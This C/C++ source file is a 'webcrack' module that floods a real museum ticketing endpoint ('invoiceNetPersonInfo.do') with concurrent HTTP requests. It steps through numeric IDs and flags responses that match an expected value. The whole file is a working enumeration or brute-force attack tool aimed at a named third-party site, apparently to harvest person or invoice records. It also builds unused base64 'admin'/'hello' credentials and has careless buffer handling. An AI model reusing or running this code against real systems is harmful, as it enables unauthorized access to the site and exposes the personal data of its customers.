#include <stdio.h>
#include <assert.h>
#include <string.h>
#include <stdlib.h>

#include <list>
#include <string>

#include <wait/platform.h>
#include <wait/module.h>
#include <wait/callout.h>
#include <wait/slotwait.h>
#include <wait/slotsock.h>

#include "base64.h"

static int _webcrack_ref = 0;
static int _total_bytes_in = 0;
static int _total_bytes_out = 0;
static slotcb _slot_finish = 0;
static int webcrack_close(struct webcrack_ctx *ctxp);
static std::list<int> _failure_list;

static const char *
get_schema(const char *url, char *schema, size_t len)
{
	if (strncmp(url, "http://", 7) == 0) {
		strncpy(schema, "http://", len);
		return (url + 7);
	}

	fprintf(stderr, "unkown schema\n");
	return url;
}

static const char *
get_hostname(const char *url, char *hostname, size_t len)
{
	while (*url) {
		switch (*url) {
			case '/':
			   	if (len > 0)
				   	*hostname = 0;
				return url;

			case ':':
			   	if (len > 0)
				   	*hostname = 0;
				return url;

			default:
				if (len > 1) {
					*hostname++ = *url;
					len--;
				}
				break;
		}

		url++;
	}

	if (len > 0)
		*hostname = 0;

	return url;
}

static const char *
get_porttext(const char *url, char *porttext, size_t len)
{
	if (*url != ':') {
		strncpy(porttext, "80", len);
		return url;
	}

	url++;
	while (*url) {
		switch (*url) {
			case '/':
			   	if (len > 0)
				   	*porttext = 0;
				return url;

			default:
				if (len > 1) {
					*porttext ++ = *url;
					len--;
				}
				break;
		}

		url++;
	}

	if (len > 0)
		*porttext = 0;

	return url;
}

static const char *
get_url_path(const char *url, char *url_path, size_t len)
{
	int c = len;

	if (*url != '/') {
		strncpy(url_path, "/", len);
		return url;
	}

	while ((c-- > 0) && (*url_path++ = *url++));
	return url;
}

struct webcrack_ctx {
	int flags;
	int sockfd;
	int key_index;
	int http_head_off;
	int http_head_len;
	char *http_head_buf;
	std::string http_response;
	struct sockcb *sockcbp;
	struct waitcb crack_timer;
	struct waitcb sock_rwait;
	struct waitcb sock_wwait;
};

static int webcrack_invoke(struct webcrack_ctx *ctxp)
{
	int len;
	char buf[8192];

	if (waitcb_completed(&ctxp->sock_wwait) &&
			ctxp->http_head_off < ctxp->http_head_len) {
		do {
			len = send(ctxp->sockfd, 
					ctxp->http_head_buf + ctxp->http_head_off,
					ctxp->http_head_len - ctxp->http_head_off, 0);
			if (len > 0) {
				ctxp->http_head_off += len;
				_total_bytes_out += len;
			} else if (WSAGetLastError() == WSAEWOULDBLOCK) {
				waitcb_clear(&ctxp->sock_wwait);
			} else {
				return 0;
			}
		} while (len > 0 && ctxp->http_head_off < ctxp->http_head_len);
	}

	if (waitcb_completed(&ctxp->sock_rwait)) {
		do {
			len = recv(ctxp->sockfd, buf, sizeof(buf) - 1, 0);
		   	if (len == 0) {
			   	return 0;
		   	}

			if (len > 0) {
				ctxp->http_response.append(buf, len);
				_total_bytes_in += len;
				break;
			}

			if (WSAGetLastError() != WSAEWOULDBLOCK)
			   	return 0;
		} while ( 0 );

		waitcb_clear(&ctxp->sock_rwait);
	}

	if (ctxp->http_head_off < ctxp->http_head_len)
	   	sock_write_wait(ctxp->sockcbp, &ctxp->sock_wwait);
   
	sock_read_wait(ctxp->sockcbp, &ctxp->sock_rwait);

	if (waitcb_completed(&ctxp->crack_timer)) {
		fprintf(stderr, "connect timeout!\n");
		return 0;
	}

	callout_reset(&ctxp->crack_timer, 24000);
	return 1;
}

static void webcrack_routine(void *upp)
{
	int len;
	const char *bufp;
	struct webcrack_ctx *ctxp;

	ctxp = (struct webcrack_ctx *)upp;
	if (webcrack_invoke(ctxp) == 0) {
		if (WSAGetLastError() != 0)
		   	fprintf(stderr, "webcrack_close: %d\n", WSAGetLastError());
		if (ctxp->http_response.size() == 0) {
			int index = ctxp->key_index;
			_failure_list.push_back(index);
		} else {
		   	bufp = ctxp->http_response.c_str();
		   	if (strstr(bufp, "option") &&
				   	strstr(bufp, "value=\"2011-06-06\""))
			   	fprintf(stderr, "success: %d\n", ctxp->key_index);
		}
		webcrack_close(ctxp);
		_webcrack_ref--;
	}

	return;
}

static const char *
get_auth_val(const char *user, const char *pass, char *buf, size_t len)
{
	char *p;
	int l, f;
	struct b64_enc_up b64enc;

	l = strlen(user) + strlen(pass) + 2;
   	p = new char[l];
	strcpy(p, user);
	strcat(p, ":");
	strcat(p, pass);

	b64_enc_init(&b64enc);
	assert(len > 0);
   	b64_enc_trans(&b64enc, buf, len - 1, p, l);
	delete[] p;

	f = b64enc.enc_last_out;
	b64_enc_finish(&b64enc, buf + f, len - f - 1);
	buf[b64enc.enc_last_out + f] = 0;
	return buf;
}

struct webcrack_ctx *
webcrack_create(const char *url, const char *user, const char *pass, int index)
{
	int error;
	char schema[8];
	char porttext[8];
	char hostname[256];
	char url_path[512];
	char auth_val[512];
	char http_head_buf[8192];

	struct webcrack_ctx *ctxp;
	struct sockaddr *addr_inp;
	struct sockaddr_in addr_in1;
	const char * part_urlp = 0;
	const char * port_urlp = 0;
	const char * path_urlp = 0;

	part_urlp = get_schema(url, schema, sizeof(schema));
	part_urlp = get_hostname(part_urlp, hostname, sizeof(hostname));
	part_urlp = get_porttext(port_urlp = part_urlp, porttext, sizeof(porttext));
	part_urlp = get_url_path(path_urlp = part_urlp, url_path, sizeof(url_path));

	get_auth_val(user, pass, auth_val, sizeof(auth_val));
	if (port_urlp == path_urlp) {
	   	sprintf(http_head_buf, 
			"GET %s HTTP/1.1\r\n"
			"Connection: close\r\n"
			"Host: %s\r\n"
			"\r\n", url_path,  hostname);
	   	strncat(hostname, ":", sizeof(hostname));
	   	strncat(hostname, porttext, sizeof(hostname));
	} else {
	   	strncat(hostname, ":", sizeof(hostname));
	   	strncat(hostname, porttext, sizeof(hostname));
	   	sprintf(http_head_buf, 
			"GET %s HTTP/1.1\r\n"
			"Connection: close\r\n"
			"Host: %s\r\n"
			"\r\n", url_path,  hostname);
	}

	error = getaddrbyname(hostname, &addr_in1);
	assert(error == 0);

	ctxp = new webcrack_ctx;
	ctxp->flags = 0;
	ctxp->key_index = index;
	ctxp->sockfd = socket(AF_INET, SOCK_STREAM, 0);
	assert(ctxp->sockfd != -1);
	ctxp->http_head_off = 0;
	ctxp->http_head_len = strlen(http_head_buf);
	ctxp->http_head_buf = strdup(http_head_buf);

	waitcb_init(&ctxp->sock_rwait, webcrack_routine, ctxp);
	waitcb_init(&ctxp->sock_wwait, webcrack_routine, ctxp);
	waitcb_init(&ctxp->crack_timer, webcrack_routine, ctxp);

	ctxp->sockcbp = sock_attach(ctxp->sockfd);
	addr_inp = (struct sockaddr *)&addr_in1;
	error = connect(ctxp->sockfd, addr_inp, sizeof(addr_in1));
	if (error == 0) {
		waitcb_switch(&ctxp->sock_wwait);
		_webcrack_ref++;
	} else if (WSAGetLastError() == WSAEWOULDBLOCK) {
	   	sock_write_wait(ctxp->sockcbp, &ctxp->sock_wwait);
	   	callout_reset(&ctxp->crack_timer, 24000);
		_webcrack_ref++;
	} else {
		fprintf(stderr, "connect: %d\n", WSAGetLastError());
		webcrack_close(ctxp);
		ctxp = 0;
	}
	return ctxp;
}

static int
webcrack_close(struct webcrack_ctx *ctxp)
{
	slot_wakeup(&_slot_finish);
	sock_detach(ctxp->sockcbp);
	waitcb_clean(&ctxp->sock_rwait);
	waitcb_clean(&ctxp->sock_wwait);
	waitcb_clean(&ctxp->crack_timer);
	free(ctxp->http_head_buf);
	closesocket(ctxp->sockfd);
	delete ctxp;
	return 0;
}

static int _last_auth_count = 0;
static int _total_auth_count = 0;
static struct waitcb _auth_finish;
static struct waitcb _auth_display;

static void update_display(void *upp)
{
	if (_last_auth_count != _total_auth_count) {
	   	fprintf(stderr, "stat: %8d %8d %8d %8d\n",
				_total_bytes_in, _total_bytes_out,
			   	_total_auth_count, _total_auth_count - _last_auth_count);
		_last_auth_count = _total_auth_count;
	}
	callout_reset(&_auth_display, 1000);
}

static void auth_callback(void *upp)
{
	int i;
	int old_ref = _webcrack_ref;
	struct webcrack_ctx * ctxp;
	static int start_num = 11940000;
   	const char * url = "http://ticket.hnmuseum.com/online/invoiceNetPersonInfo.do?bean.startdate=%u";
	slot_record(&_slot_finish, &_auth_finish);

	for (i = 0; old_ref + i < 5; i++) {
		char buf[8192];

		if (!_failure_list.empty()) {
			start_num = *_failure_list.begin();
		   	sprintf(buf, url, start_num);
		   	if (webcrack_create(buf, "admin", "hello", start_num)) {
				_failure_list.erase(_failure_list.begin());
			   	_total_auth_count++;
		   	}
			continue;
		}

		sprintf(buf, url, start_num);
		if (webcrack_create(buf, "admin", "hello", start_num)) {
			_total_auth_count++;
			start_num++;
		}
	}
}

static void module_init(void)
{
	waitcb_init(&_auth_display, update_display, NULL);
	waitcb_init(&_auth_finish, auth_callback, NULL);
	//callout_reset(&_auth_display, 1000);
	//waitcb_switch(&_auth_finish);
}

static void module_clean(void)
{
	waitcb_clean(&_auth_display);
	waitcb_clean(&_auth_finish);
}

struct module_stub webcrack_mod = {
	module_init, module_clean
};

